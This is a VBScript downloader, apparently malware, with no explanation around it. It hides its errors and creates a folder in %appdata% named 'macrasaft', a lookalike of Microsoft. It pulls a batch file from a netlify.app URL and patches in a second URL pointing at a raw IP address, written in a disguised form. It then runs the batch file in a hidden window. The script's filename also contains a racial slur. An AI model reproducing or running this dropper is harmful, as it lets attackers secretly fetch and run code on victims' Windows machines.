On Error Resume Next

Const appFolder = "%appdata%\macrasaft"
Const batchFile = "%appdata%\macrasaft\special.bat"
Const srcUrl = "https://cerulean-puppy-776621.netlify.app/main.txt"
Const placeholder = "****"
Const replUrl = "https:$$115.187.41.77$nigga.txt"

Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")

If Not fso.FolderExists(shell.ExpandEnvironmentStrings(appFolder)) Then
    fso.CreateFolder shell.ExpandEnvironmentStrings(appFolder)
End If

Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", srcUrl, False
http.Send
If http.Status = 200 Then
    fso.CreateTextFile(shell.ExpandEnvironmentStrings(batchFile), True).Write http.ResponseText
Else
    WScript.Quit
End If

WScript.Sleep 3000

If fso.FileExists(shell.ExpandEnvironmentStrings(batchFile)) Then
    Set file = fso.OpenTextFile(shell.ExpandEnvironmentStrings(batchFile), 1)
    content = file.ReadAll
    file.Close
    Set file = fso.OpenTextFile(shell.ExpandEnvironmentStrings(batchFile), 2)
    file.Write Replace(content, placeholder, replUrl)
    file.Close
Else
    WScript.Quit
End If

WScript.Sleep 2000

shell.Run "cmd /c timeout /t 2 & """ & shell.ExpandEnvironmentStrings(batchFile) & """", 0, False